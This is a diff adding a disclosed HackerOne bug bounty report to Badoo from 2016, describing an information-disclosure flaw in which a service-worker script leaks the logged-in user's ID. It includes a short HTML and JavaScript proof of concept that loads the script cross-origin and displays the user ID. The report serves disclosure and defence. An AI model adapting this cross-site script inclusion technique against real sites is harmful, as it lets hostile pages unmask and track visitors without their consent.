@@ -1,0 +1,31 @@
+ReportLink:https://hackerone.com/reports/130453
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/symbiansymoh
+ReportedTo:Badoo(badoo)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:16.05.2016 7:10:56
+
+Summary:
+
+Hi,
+
+I have found that endpoint is leaking the currently logged in user which will result in stealing the user id and unmasking the current user, This behavior could be malicious to ads websites, rouge websites, etc...
+
+PoC Code:
+<html>
+<head>
+<title>Badoo Current User Unmasking</title>
+<script src=https://badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
+</head>
+<body>
+<script>
+function UnmaskUser(str) {
+return str.split('=')[0];
+}
+window.onload = function(){
+var user = UnmaskUser(user_id);alert(user);};
+</script>
+
+Thanks
